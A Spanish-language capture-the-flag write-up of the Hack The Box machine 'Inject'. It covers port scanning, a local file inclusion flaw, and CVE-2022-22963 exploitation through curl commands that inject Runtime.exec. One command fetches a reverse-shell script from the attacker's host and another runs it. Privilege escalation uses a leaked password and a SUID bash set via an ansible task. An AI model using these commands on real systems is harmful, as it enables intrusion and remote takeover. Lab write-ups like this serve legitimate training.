

![1](</Writeups/Machines/Inject/img/logo.png>)
By Rug4lo

## Reconocimiento

Vamos a empezar haciendo un escaneo de puertos con Nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.204
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 16:31 CEST
Initiating SYN Stealth Scan at 16:31
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 16:32, 14.18s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.11s latency).
Scanned at 2023-10-04 16:31:58 CEST for 14s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
           Raw packets sent: 70185 (3.088MB) | Rcvd: 69796 (2.792MB)
```
Ahora vamos a user Nmap con los scripts de reconocimiento básicos
```bash
nmap -sCV -p22,8080 10.10.11.204 -oN Targeted
```
```bash
Nmap scan report for 10.10.11.204
Host is up (0.14s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
```
Si miramos un poco la pagina veremos que tiene un apartado de subida de archivos

![1](</Writeups/Machines/Inject/img/1.png>)

## Explotación del LFI

Cuando subimos un archivo veremos que nos deja ver la imagen que hemos subido, pero si miramos con detalle la url, veremos que hay posibilidad de que se acontezca un LFI

![1](</Writeups/Machines/Inject/img/2.png>)

Podemos probar a listar el etc/passwd de la maquina (con burpsuite podremos ver el output)

![1](</Writeups/Machines/Inject/img/3.png>)

También podremos ver que tenemos capacidad de directory listing

![1](</Writeups/Machines/Inject/img/4.png>)

Con todo esto podemos ir buscando si hay algo interesante, si buscamos, encontraremos que esta pagina esta usando **springframework**

![1](</Writeups/Machines/Inject/img/5.png>)
![1](</Writeups/Machines/Inject/img/6.png>)

## Abuso del Spring-framework desactualizado

Buscando encontraremos un CVE para ese servicio

CVE --> https://github.com/me2nuk/CVE-2022-22963

Si hacemos la peticion tal como indica el CVE y le indicamos que haga un ping a nuestra maquina, veremos que ejecuta el comando perfectamente
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.9:8081")' --data-raw 'data' -v
```
Ahora podemos probar a enviar una Reverse Shell, pero no nos funcionara, como solución a esto podemos crear un archivo con el comando de la Reverse Shell en nuestro directorio de trabajo y hacer que se lo descargue para posteriormente ejecutarlo

Si creamos un servidor http con Python en el directorio donde tenemos la reverseshell y le hacemos un curl a este, podremos ver con el LFI que nos lo hemos descargado
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.9:8081/reverse.sh -o /var/www/WebApp/reverse")' --data-raw 'data' -v
```
Ahora solo tendríamos que ejecutarlo
```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /var/www/WebApp/reverse")' --data-raw 'data' -v
```
## Escalada Usuario Frank a Phil

Y con esto ya tendíamos acceso al usuario  **Frank**, ahora para conseguir la flag necesitamos escalar al usuario **Phil**

Dentro del home del usuario Frank, podemos ver que hay una carpeta rara (.m2), esta carpeta contiene un settings.xml el cual contiene la contraseña para el usuario Phil

![1](</Writeups/Machines/Inject/img/7.png>)

## Escalada Usuario Phil a Root

Si probamos esta contraseña veremos que es correcta y podremos acceder a la user flag.

![1](</Writeups/Machines/Inject/img/8.png>)

Ahora para la root, empezamos pasándonos el pspy a nuestra maquina victima, con el veremos que hay un proceso curioso cuanto menos

![1](</Writeups/Machines/Inject/img/9.png>)

Hay un proceso automático ejecutando todos los archivos .yml de la carpeta /tasks

Vamos a la carpeta, y veremos que como estamos en el grupo staff podemos crear archivos dentro!

![1](</Writeups/Machines/Inject/img/10.png>)

Ahora crearemos un .yml que ejecute un comando para que la bash se vuelva SUID cuando ansible ejecute este archivo:

![1](</Writeups/Machines/Inject/img/11.png>)

Cuando el proceso se ejecute borrara nuestro yml pero nos pondrá la bash en SUID

![1](</Writeups/Machines/Inject/img/12.png>)

Ahora solo hay que ejecutarla 
```bash
/bin/bash -p
```
Y ya tendremos acceso a la root flag

![1](</Writeups/Machines/Inject/img/13.png>)
